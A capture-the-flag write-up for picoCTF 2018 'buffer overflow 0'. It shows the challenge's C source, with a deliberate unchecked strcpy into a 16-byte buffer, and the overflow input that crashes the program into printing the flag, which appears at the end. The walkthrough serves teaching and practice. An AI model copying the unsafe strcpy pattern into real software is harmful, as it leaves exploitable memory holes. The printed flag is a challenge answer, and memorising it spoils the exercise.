# buffer overflow 0

When we are introduced to the binary, we can see that for the most part it's pretty simple.
```
root@kali:~/Crack Me# ./vuln
This program takes 1 argument.
root@kali:~/Crack Me# ./vuln asdf
Thanks! Received: asdf
```
We pass in a command line argument, and it's returned to us. Let's take a look at the source.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  if (argc > 1) {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}
```
Interestingly, we find a `sigsegv_handler`. Essentially, when an error occurs during run time, this code is called before exiting. We can see that it simply reveals the flag to us. So all we need to do is overflow the buffer.
```
slopey112@pico-2018-shell:/problems/buffer-overflow-0_2_aab3d2a22456675a9f9c29783b256a3d$ ./vuln AAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_5d8a1fae}
```
